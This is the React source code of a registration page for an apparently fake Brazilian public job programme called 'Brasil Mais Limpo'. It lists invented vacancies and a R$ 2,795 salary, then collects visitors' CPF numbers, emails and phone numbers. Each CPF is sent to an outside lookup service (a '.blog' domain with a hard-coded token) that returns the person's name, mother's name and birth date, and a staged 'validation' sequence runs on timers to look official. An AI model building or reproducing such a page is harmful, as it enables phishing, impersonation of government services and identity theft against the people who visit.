import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { Loader2, Check } from 'lucide-react';

interface CepResponse {
  cep: string;
  logradouro: string;
  bairro: string;
  localidade: string;
  uf: string;
  erro?: boolean;
}

interface CpfResponse {
  DADOS: {
    cpf: string;
    nome: string;
    nome_mae: string;
    data_nascimento: string;
    sexo: string;
  };
}

interface ValidationStep {
  id: string;
  label: string;
  status: 'pending' | 'loading' | 'valid' | 'invalid';
}

interface NearbyUnit {
  name: string;
  fullName: string;
  distance: number;
  address: string;
  vagas: number;
}

const getRegionalCompany = (uf: string): { name: string; fullName: string; region: string; nearbyUnits: NearbyUnit[] } | null => {
  const companies = {
    // Sudeste
    RJ: {
      name: 'COMLURB',
      fullName: 'Companhia Municipal de Limpeza Urbana do Rio de Janeiro',
      region: 'Sudeste',
      nearbyUnits: [
        { name: 'COMLURB Centro', fullName: 'Unidade Centro', distance: 2.5, address: 'Rua Major Ávila, 358', vagas: 15 },
        { name: 'COMLURB Zona Sul', fullName: 'Unidade Zona Sul', distance: 5.8, address: 'Av. Borges de Medeiros, 1444', vagas: 8 }
      ]
    },
    SP: {
      name: 'Construrban',
      fullName: 'Construrban S/A',
      region: 'Sudeste',
      nearbyUnits: [
        { name: 'Construrban Centro', fullName: 'Unidade Centro SP', distance: 1.8, address: 'Av. Paulista, 1000', vagas: 25 },
        { name: 'Construrban Leste', fullName: 'Unidade Zona Leste', distance: 4.2, address: 'Av. Mateo Bei, 2000', vagas: 18 }
      ]
    },
    MG: {
      name: 'Localix',
      fullName: 'Localix Serviços Ambientais',
      region: 'Sudeste',
      nearbyUnits: [
        { name: 'Localix BH', fullName: 'Unidade Belo Horizonte', distance: 3.1, address: 'Av. Amazonas, 1234', vagas: 20 },
        { name: 'Localix Contagem', fullName: 'Unidade Contagem', distance: 7.5, address: 'Av. João César, 500', vagas: 12 }
      ]
    },
    // Sul
    RS: {
      name: 'CODECA',
      fullName: 'Companhia de Desenvolvimento de Caxias do Sul',
      region: 'Sul',
      nearbyUnits: [
        { name: 'CODECA Centro', fullName: 'Unidade Centro', distance: 2.0, address: 'Rua Plácido de Castro, 1050', vagas: 30 },
        { name: 'CODECA Norte', fullName: 'Unidade Zona Norte', distance: 5.5, address: 'Av. Rio Branco, 1500', vagas: 15 }
      ]
    },
    SC: {
      name: 'COMCAP',
      fullName: 'Companhia Melhoramentos da Capital',
      region: 'Sul',
      nearbyUnits: [
        { name: 'COMCAP Centro', fullName: 'Unidade Centro', distance: 1.5, address: 'Rua 14 de Julho, 375', vagas: 28 },
        { name: 'COMCAP Continental', fullName: 'Unidade Continental', distance: 6.2, address: 'Av. Atlântica, 1500', vagas: 17 }
      ]
    },
    PR: {
      name: 'URBS',
      fullName: 'Urbanização de Curitiba S/A',
      region: 'Sul',
      nearbyUnits: [
        { name: 'URBS Centro', fullName: 'Unidade Centro', distance: 2.3, address: 'Av. Presidente Kennedy, 2800', vagas: 22 },
        { name: 'URBS CIC', fullName: 'Unidade CIC', distance: 8.1, address: 'Rua João Bettega, 1500', vagas: 13 }
      ]
    },
    // Centro-Oeste
    DF: {
      name: 'SLU',
      fullName: 'Superintendência de Limpeza Urbana do Distrito Federal',
      region: 'Centro-Oeste',
      nearbyUnits: [
        { name: 'SLU Plano Piloto', fullName: 'Unidade Plano Piloto', distance: 3.0, address: 'SCS Q. 4, Bl. A', vagas: 40 },
        { name: 'SLU Taguatinga', fullName: 'Unidade Taguatinga', distance: 9.5, address: 'QNM 34, Área Especial 1', vagas: 25 }
      ]
    },
    GO: {
      name: 'Comurg',
      fullName: 'Companhia de Urbanização do Município de Goiânia',
      region: 'Centro-Oeste',
      nearbyUnits: [
        { name: 'Comurg Centro', fullName: 'Unidade Centro', distance: 1.2, address: 'Av. Independência, Qd. 02, Lt. 03', vagas: 35 },
        { name: 'Comurg Sul', fullName: 'Unidade Região Sul', distance: 4.5, address: 'Rua 18, Qd. 45, Lt. 12', vagas: 22 }
      ]
    },
    MS: {
      name: 'Solurb',
      fullName: 'Solurb S/A',
      region: 'Centro-Oeste',
      nearbyUnits: [
        { name: 'Solurb Centro', fullName: 'Unidade Centro', distance: 2.8, address: 'Av. Afonso Pena, 3297', vagas: 18 },
        { name: 'Solurb Sul', fullName: 'Unidade Sul', distance: 6.4, address: 'Rua da Divisão, 1000', vagas: 12 }
      ]
    },
    // Nordeste
    BA: {
      name: 'Limpurb',
      fullName: 'Empresa de Limpeza Urbana de Salvador',
      region: 'Nordeste',
      nearbyUnits: [
        { name: 'Limpurb Centro', fullName: 'Unidade Centro', distance: 2.1, address: 'Av. ACM, 3200', vagas: 45 },
        { name: 'Limpurb Subúrbio', fullName: 'Unidade Subúrbio', distance: 7.8, address: 'Rua São Caetano, 1500', vagas: 28 }
      ]
    },
    PE: {
      name: 'Emprel',
      fullName: 'Empresa Pernambucana de Resíduos e Limpeza Urbana',
      region: 'Nordeste',
      nearbyUnits: [
        { name: 'Emprel Centro', fullName: 'Unidade Centro', distance: 1.9, address: 'Av. Dantas Barreto, 1000', vagas: 32 },
        { name: 'Emprel Zona Norte', fullName: 'Unidade Zona Norte', distance: 5.7, address: 'Av. Norte, 5000', vagas: 24 }
      ]
    },
    RN: {
      name: 'Urbana',
      fullName: 'Urbana S/A',
      region: 'Nordeste',
      nearbyUnits: [
        { name: 'Urbana Centro', fullName: 'Unidade Centro', distance: 2.4, address: 'Av. Rio Branco, 650', vagas: 20 },
        { name: 'Urbana Sul', fullName: 'Unidade Sul', distance: 6.9, address: 'Av. Prudente de Morais, 1200', vagas: 15 }
      ]
    },
    SE: {
      name: 'Emsurb',
      fullName: 'Empresa Municipal de Serviços Urbanos de Aracaju',
      region: 'Nordeste',
      nearbyUnits: [
        { name: 'Emsurb Centro', fullName: 'Unidade Centro', distance: 1.7, address: 'Av. Desembargador Maynard, 1200', vagas: 25 },
        { name: 'Emsurb Sul', fullName: 'Unidade Sul', distance: 4.8, address: 'Av. Gonçalo Prado, 800', vagas: 18 }
      ]
    },
    // Norte
    RO: {
      name: 'EMDUR',
      fullName: 'Empresa Municipal de Desenvolvimento Urbano de Porto Velho',
      region: 'Norte',
      nearbyUnits: [
        { name: 'EMDUR Centro', fullName: 'Unidade Centro', distance: 2.2, address: 'Av. Sete de Setembro, 1044', vagas: 22 },
        { name: 'EMDUR Leste', fullName: 'Unidade Leste', distance: 5.9, address: 'Av. Mamoré, 1200', vagas: 16 }
      ]
    },
    AM: {
      name: 'Urbana Manaus',
      fullName: 'Empresa de Limpeza e Serviços Urbanos de Manaus',
      region: 'Norte',
      nearbyUnits: [
        { name: 'Urbana Centro', fullName: 'Unidade Centro', distance: 2.6, address: 'Av. Eduardo Ribeiro, 1200', vagas: 30 },
        { name: 'Urbana Zona Sul', fullName: 'Unidade Zona Sul', distance: 7.2, address: 'Av. Carvalho Leal, 1500', vagas: 20 }
      ]
    },
    AP: {
      name: 'Emurb',
      fullName: 'Empresa Municipal de Urbanização de Macapá',
      region: 'Norte',
      nearbyUnits: [
        { name: 'Emurb Centro', fullName: 'Unidade Centro', distance: 1.8, address: 'Av. FAB, 800', vagas: 18 },
        { name: 'Emurb Sul', fullName: 'Unidade Sul', distance: 4.5, address: 'Av. Treze de Setembro, 1000', vagas: 12 }
      ]
    }
  };
  
  return companies[uf as keyof typeof companies] || null;
};

const Registration = () => {
  const navigate = useNavigate();
  const [cep, setCep] = useState('');
  const [loading, setLoading] = useState(false);
  const [cepData, setCepData] = useState<CepResponse | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [showResults, setShowResults] = useState(false);
  const [selectedUnit, setSelectedUnit] = useState<string | null>(null);
  const [showForm, setShowForm] = useState(false);
  const [cpf, setCpf] = useState('');
  const [cpfData, setCpfData] = useState<CpfResponse | null>(null);
  const [validationSteps, setValidationSteps] = useState<ValidationStep[]>([
    { id: 'cpf', label: 'Validando CPF', status: 'pending' },
    { id: 'name', label: 'Verificando Nome', status: 'pending' },
    { id: 'mother', label: 'Verificando Nome da Mãe', status: 'pending' },
    { id: 'birth', label: 'Validando Data de Nascimento', status: 'pending' },
    { id: 'eligibility', label: 'Verificando Elegibilidade', status: 'pending' }
  ]);
  const [validationProgress, setValidationProgress] = useState(0);
  const [isValidating, setIsValidating] = useState(false);
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const formRef = useRef<HTMLDivElement>(null);

  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 8) value = value.slice(0, 8);
    if (value.length > 5) {
      value = value.slice(0, 5) + '-' + value.slice(5);
    }
    setCep(value);
    setShowResults(false);
    setSelectedUnit(null);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    setShowResults(false);
    setSelectedUnit(null);
    
    const cleanCep = cep.replace(/\D/g, '');
    
    if (cleanCep.length !== 8) {
      setError('CEP inválido. Digite um CEP com 8 números.');
      setLoading(false);
      return;
    }

    try {
      // Artificial delay to simulate processing
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const data: CepResponse = await response.json();
      
      if (data.erro) {
        setError('CEP não encontrado');
      } else {
        setCepData(data);
        setShowResults(true);
        // Pre-select the nearest unit
        const company = getRegionalCompany(data.uf);
        if (company) {
          const nearestUnit = company.nearbyUnits.reduce((prev, curr) => 
            prev.distance < curr.distance ? prev : curr
          );
          setSelectedUnit(nearestUnit.name);
        }
      }
    } catch (err) {
      setError('Erro ao consultar o CEP. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  const handleStartRegistration = () => {
    setShowForm(true);
    setTimeout(() => {
      if (formRef.current) {
        formRef.current.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    }, 100);
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 11) value = value.slice(0, 11);
    if (value.length > 9) {
      value = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6, 9) + '-' + value.slice(9);
    } else if (value.length > 6) {
      value = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6);
    } else if (value.length > 3) {
      value = value.slice(0, 3) + '.' + value.slice(3);
    }
    setCpf(value);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 11) value = value.slice(0, 11);
    if (value.length > 7) {
      value = `(${value.slice(0, 2)}) ${value.slice(2, 7)}-${value.slice(7)}`;
    } else if (value.length > 2) {
      value = `(${value.slice(0, 2)}) ${value.slice(2)}`;
    } else if (value.length > 0) {
      value = `(${value}`;
    }
    setPhone(value);
  };

  const validateCpf = async () => {
    const cleanCpf = cpf.replace(/\D/g, '');
    if (cleanCpf.length !== 11) {
      return false;
    }
    
    setIsValidating(true);
    setValidationProgress(0);
    
    try {
      // Reset validation steps
      setValidationSteps(steps => steps.map(step => ({ ...step, status: 'pending' })));
      
      // Update CPF validation status
      setValidationSteps(steps => 
        steps.map(step => 
          step.id === 'cpf' ? { ...step, status: 'loading' } : step
        )
      );
      setValidationProgress(20);

      // Add 5-second delay before starting validation
      await new Promise(resolve => setTimeout(resolve, 5000));
      
      // Fetch CPF data
      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cleanCpf}`);
      const data: CpfResponse = await response.json();
      
      if (!data.DADOS) {
        throw new Error('CPF não encontrado');
      }
      
      setCpfData(data);
      
      // Simulate validation steps with delays
      const steps = ['cpf', 'name', 'mother', 'birth', 'eligibility'];
      for (let i = 0; i < steps.length; i++) {
        setValidationSteps(prevSteps =>
          prevSteps.map(step =>
            step.id === steps[i] ? { ...step, status: 'loading' } : step
          )
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        setValidationSteps(prevSteps =>
          prevSteps.map(step =>
            step.id === steps[i] ? { ...step, status: 'valid' } : step
          )
        );
        
        setValidationProgress((i + 1) * 20);
      }
      
      return true;
    } catch (error) {
      setValidationSteps(steps =>
        steps.map(step => ({ ...step, status: 'invalid' }))
      );
      return false;
    } finally {
      setIsValidating(false);
    }
  };

  const handleSearchCpf = async () => {
    const isValid = await validateCpf();
    if (!isValid) {
      setError('CPF inválido ou não encontrado');
    }
  };

  const handleContinueRegistration = () => {
    if (email && phone && acceptedTerms && company) {
      // First scroll to top
      window.scrollTo({
        top: 0,
        behavior: 'smooth'
      });

      // After scrolling, navigate to confirmation
      setTimeout(() => {
        const selectedUnitData = company.nearbyUnits.find(unit => unit.name === selectedUnit);
        navigate('/confirmacao', { 
          state: { 
            selectedUnit: selectedUnitData
          }
        });
      }, 500);
    }
  };

  const company = cepData ? getRegionalCompany(cepData.uf) : null;

  return (
    <div className="min-h-screen bg-gray-100">
      <Header />

      {loading && (
        <div className="fixed top-0 left-0 right-0 bg-white shadow-md z-50 transition-all duration-300 ease-in-out">
          <div className="max-w-md mx-auto p-4">
            <div className="flex items-center gap-3">
              <Loader2 className="w-5 h-5 animate-spin text-[#1351B4]" />
              <div>
                <p className="font-semibold text-gray-900">Verificando disponibilidade...</p>
                <p className="text-sm text-gray-600">Estamos consultando a base de dados para verificar disponibilidade na sua região.</p>
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="max-w-3xl mx-auto py-10">
        <div className="bg-white rounded-lg shadow-md p-6 mx-4">
          {!showForm ? (
            <>
              <div id="topo-inscricao\" className="w-full mx-auto mb-8">
                <h1 className="text-[#0C336F] text-2xl md:text-3xl font-bold">Brasil Mais Limpo</h1>
                <div className="h-1 w-20 bg-green-500 mt-2"></div>
              </div>
              
              <h2 className="text-xl font-semibold text-[#2557a7] mb-6">Verificação de Disponibilidade</h2>
              
              <p className="text-gray-700 mb-8">
                Para iniciar sua inscrição no programa Brasil Mais Limpo, primeiro verifique se há vagas disponíveis em sua região. Digite seu CEP abaixo para consultar a disponibilidade.
              </p>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label htmlFor="cep" className="block text-lg font-medium text-gray-700 mb-2">
                    CEP
                  </label>
                  <input
                    type="text"
                    id="cep"
                    placeholder="Digite seu CEP (Ex: 12345-678)"
                    value={cep}
                    onChange={handleCepChange}
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    maxLength={9}
                  />
                  <p className="mt-2 text-sm text-gray-600">
                    Digite o CEP da sua residência para verificarmos a disponibilidade na sua região
                  </p>
                  {error && (
                    <p className="mt-2 text-sm text-red-600">{error}</p>
                  )}
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 text-white py-2 bg-[#1451B4] hover:bg-blue-800 rounded-full h-12 px-6 text-base w-full"
                >
                  <i className="fas fa-search mr-2 text-base text-white"></i>
                  {loading ? 'Verificando...' : 'Verificar Disponibilidade'}
                </button>
              </form>

              {showResults && cepData && (
                <div className="mt-8 space-y-4">
                  <div className="bg-white rounded-lg p-4 shadow border border-gray-200">
                    <p className="text-green-600 font-semibold mb-4">✓ CEP encontrado!</p>
                    <div className="space-y-2">
                      <p><span className="font-medium">Cidade:</span> {cepData.localidade}</p>
                      <p><span className="font-medium">Estado:</span> {cepData.uf}</p>
                      <p><span className="font-medium">Bairro:</span> {cepData.bairro}</p>
                      <p><span className="font-medium">Logradouro:</span> {cepData.logradouro}</p>
                    </div>
                  </div>

                  {company ? (
                    <div className="bg-white rounded-lg p-4 shadow border border-gray-200">
                      <h3 className="text-[#1351B4] font-bold mb-2">
                        Empresa Responsável na Região {company.region}
                      </h3>
                      <p className="font-bold">{company.name}</p>
                      <p className="text-gray-600 text-sm mb-4">{company.fullName}</p>

                      <h4 className="font-semibold text-[#1351B4] mb-2">Unidades mais próximas:</h4>
                      <div className="space-y-3">
                        {company.nearbyUnits.map((unit, index) => (
                          <div 
                            key={index} 
                            className={`p-3 rounded-lg cursor-pointer transition-colors ${
                              selectedUnit === unit.name 
                                ? 'bg-blue-50 border-2 border-[#1351B4]' 
                                : 'bg-gray-50 hover:bg-blue-50'
                            }`}
                            onClick={() => setSelectedUnit(unit.name)}
                          >
                            <div className="flex justify-between items-start">
                              <div>
                                <p className="font-semibold">{unit.name}</p>
                                <p className="text-sm text-gray-600">{unit.address}</p>
                              </div>
                              <span className="text-sm text-gray-500">{unit.distance} km</span>
                            </div>
                            <p className="text-[#1351B4] font-semibold mt-2">
                              Vagas disponíveis: {unit.vagas}
                            </p>
                            {selectedUnit === unit.name && (
                              <div className="mt-2 text-[#1351B4] text-sm font-medium">
                                ✓ Unidade selecionada
                              </div>
                            )}
                          </div>
                        ))}
                      </div>
                    </div>
                  ) : (
                    <div className="bg-yellow-50 p-4 rounded-lg border border-yellow-200">
                      <p className="text-yellow-800">
                        Para este estado, as vagas são gerenciadas diretamente pela prefeitura local.
                        Entre em contato com a prefeitura da sua cidade para mais informações.
                      </p>
                      <div className="mt-4">
                        <p className="text-[#1351B4] font-semibold">
                          Você ainda pode prosseguir com sua inscrição. A prefeitura entrará em contato posteriormente.
                        </p>
                      </div>
                    </div>
                  )}

                  <div className="bg-[#1351B4] text-white p-4 rounded-lg text-center">
                    <p className="font-bold">
                      {company 
                        ? 'Há vagas disponíveis para sua região!'
                        : 'Sua inscrição será encaminhada para análise da prefeitura local'}
                    </p>
                  </div>

                  <button 
                    onClick={handleStartRegistration}
                    className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 text-white py-2 bg-[#1451B4] hover:bg-blue-800 rounded-full h-12 px-6 text-base w-full"
                  >
                    <i className="fas fa-user-plus mr-2 text-white"></i>
                    <span className="text-white">Iniciar Inscrição</span>
                  </button>
                </div>
              )}

              <div className="mt-10 bg-yellow-50 p-5 rounded-md border-l-4 border-yellow-400">
                <h3 className="font-bold text-[#0A0A0A] text-xl mb-3">Informações Importantes</h3>
                <ul className="list-disc ml-6 space-y-3 text-gray-700 text-base">
                  <li>Apenas cidadãos brasileiros ou naturalizados podem se inscrever.</li>
                  <li>É necessário ter ensino fundamental (5º ano) completo para participar do programa.</li>
                  <li>As vagas são distribuídas de acordo com a necessidade de cada município.</li>
                  <li>Salário inicial de R$ 2.795,00 com benefícios adicionais (vale-alimentação, transporte, saúde e outros).</li>
                </ul>
              </div>
            </>
          ) : (
            <div ref={formRef} className="space-y-6">
              <div>
                <h2 className="text-xl font-semibold text-[#2557a7] mb-6">Formulário de Inscrição</h2>
                <p className="text-gray-600 mb-4">
                  Preencha seus dados abaixo para se inscrever no programa Brasil Mais Limpo.
                </p>
              </div>

              <div>
                <label htmlFor="cpf" className="block text-sm font-medium text-gray-700 mb-1">
                  CPF
                </label>
                <div className="relative">
                  <input
                    type="text"
                    id="cpf"
                    value={cpf}
                    onChange={handleCpfChange}
                    placeholder="Digite seu CPF (123.456.789-00)"
                    className="w-full p-3 pr-12 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    maxLength={14}
                    disabled={isValidating}
                  />
                  <button  
                    onClick={handleSearchCpf}
                    disabled={isValidating || cpf.length < 14}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 bg-[#1451B4] text-white p-2 rounded-full hover:bg-blue-800 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {isValidating ? (
                      <Loader2 className="w-4 h-4 animate-spin" />
                    ) : (
                      <i className="fas fa-search text-sm"></i>
                    )}
                  </button>
                </div>
                {error && (
                  <p className="mt-2 text-sm text-red-600">{error}</p>
                )}
              </div>

              {isValidating && (
                <div className="bg-white p-6 rounded-lg border shadow-sm w-full">
                  <h2 className="text-base font-semibold text-[#0C336F] mb-4 w-full flex items-center">
                    <div className="mr-2 bg-white text-[#1451B4] shadow-sm border border-blue-100 rounded-md w-7 h-7 flex items-center justify-center">
                      <div className="w-3.5 h-3.5 border-2 border-t-transparent border-[#1451B4] rounded-full animate-spin"></div>
                    </div>
                    <span>Verificação de dados</span>
                  </h2>
                  <div className="flex items-center mb-3 text-xs text-gray-500">
                    <div className="w-full h-1 bg-gray-100 rounded-full mr-2 overflow-hidden">
                      <div 
                        className="h-full bg-[#1451B4] transition-all duration-700 ease-in-out"
                        style={{ width: `${validationProgress}%` }}
                      ></div>
                    </div>
                    <span className="flex-shrink-0 w-8 text-right">{validationProgress}%</span>
                  </div>
                  <div className="grid grid-cols-1 gap-2 w-full">
                    {validationSteps.map((step) => (
                      <div 
                        key={step.id}
                        className={`flex items-center transition-all duration-300 ease-in-out py-2 px-3 rounded-md ${
                          step.status === 'valid' ? 'bg-green-50 border border-green-100' :
                          step.status === 'loading' ? 'bg-blue-50 border border-blue-100' :
                          'bg-gray-50 border border-gray-100'
                        }`}
                      >
                        <div className={`w-8 h-8 flex items-center justify-center rounded-md mr-3 transition-all duration-300 shadow-sm flex-shrink-0
                          ${step.status === 'valid' ? 'bg-white text-green-500 border border-green-100' :
                            step.status === 'loading' ? 'bg-white text-blue-500 border border-blue-100' :
                            'bg-white text-gray-400 border border-gray-100'}`}
                        >
                          {step.status === 'valid' && <Check className="w-4 h-4" />}
                          {step.status === 'loading' && (
                            <div className="w-4 h-4 border-2 border-t-transparent border-current rounded-full animate-spin"></div>
                          )}
                          {step.status === 'pending' && <div className="w-4 h-4 rounded-full border-2 border-current"></div>}
                        </div>
                        <div className="flex-grow">
                          <div className={`text-sm font-medium ${
                            step.status === 'valid' ? 'text-green-700' :
                            step.status === 'loading' ? 'text-blue-700' :
                            'text-gray-700'
                          }`}>
                            {step.label}
                          </div>
                        </div>
                        <div className={`flex-shrink-0 ${
                          step.status === 'valid' ? 'bg-green-100 text-green-700' :
                          step.status === 'loading' ? 'bg-blue-100 text-blue-700' :
                          'bg-gray-100 text-gray-700'
                        } text-xs py-1 px-2 rounded-md flex items-center`}>
                          {step.status === 'valid' && (
                            <>
                              <Check className="w-3 h-3 mr-1" />
                              <span>Válido</span>
                            </>
                          )}
                          {step.status === 'loading' && <span>Em análise</span>}
                          {step.status === 'pending' && <span>Pendente</span>}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {cpfData && !isValidating && (
                <div className="mt-6 space-y-4">
                  <div className="bg-green-50 p-4 rounded-lg border border-green-200">
                    <h3 className="text-green-800 font-semibold mb-2">Dados validados com sucesso!</h3>
                    <div className="space-y-2">
                      <p><span className="font-medium">Nome:</span> {cpfData.DADOS.nome}</p>
                      <p><span className="font-medium">Nome da Mãe:</span> {cpfData.DADOS.nome_mae}</p>
                      <p><span className="font-medium">Data de Nascimento:</span> {new Date(cpfData.DADOS.data_nascimento).toLocaleDateString('pt-BR')}</p>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div>
                      <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                        Email
                      </label>
                      <input
                        type="email"
                        id="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Digite seu email"
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      />
                      <p className="mt-1 text-sm text-gray-500">
                        Usaremos este email para enviar informações importantes sobre sua inscrição
                      </p>
                    </div>

                    <div>
                      <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-1">
                        Telefone
                      </label>
                      <input
                        type="text"
                        id="phone"
                        value={phone}
                        onChange={handlePhoneChange}
                        placeholder="(00) 00000-0000"
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        maxLength={15}
                      />
                      <p className="mt-1 text-sm text-gray-500">
                        Usaremos este telefone para entrar em contato caso necessário
                      </p>
                    </div>

                    <div className="flex flex-row items-start space-x-3 space-y-0 rounded-md border p-4">
                      <input
                        type="checkbox"
                        checked={acceptedTerms}
                        onChange={(e) => setAcceptedTerms(e.target.checked)}
                        className="peer h-4 w-4 shrink-0 rounded-sm border border-primary ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 data-[state=checked]:bg-primary data-[state=checked]:text-primary-foreground"
                        id="terms"
                        aria-describedby="terms-description"
                      />
                      <div className="space-y-1 leading-none">
                        <label className="text-sm font-medium peer-disabled:cursor-not-allowed peer-disabled:opacity-70" htmlFor="terms">
                          Aceito os <a href="#" className="text-blue-600">termos de uso</a> e <a href="#" className="text-blue-600">política de privacidade</a> do programa Brasil Mais Limpo
                        </label>
                        <p id="terms-description" className="text-muted-foreground text-xs">
                          Ao aceitar os termos, você concorda com as regras do programa e permite o uso dos seus dados para fins de inscrição.
                        </p>
                      </div>
                    </div>

                    <button
                      onClick={handleContinueRegistration}
                      className="w-full bg-[#1451B4] text-white font-medium py-3 px-6 rounded-full hover:bg-blue-800 transition-colors flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed mt-4"
                      disabled={!email || !phone || !acceptedTerms}
                    >
                      Continuar Inscrição
                      <i className="fas fa-arrow-right"></i>
                    </button>
                  </div>
                </div>
              )}

              <div className="mt-6 flex justify-between items-center">
                <button
                  onClick={() => {
                    setShowForm(false);
                    setCpfData(null);
                    setCpf('');
                    setError(null);
                    setValidationSteps(steps => steps.map(step => ({ ...step, status: 'pending' })));
                    setValidationProgress(0);
                    setEmail('');
                    setPhone('');
                    setAcceptedTerms(false);
                  }}
                  className="text-[#1451B4] hover:underline"
                >
                  ← Voltar
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default Registration;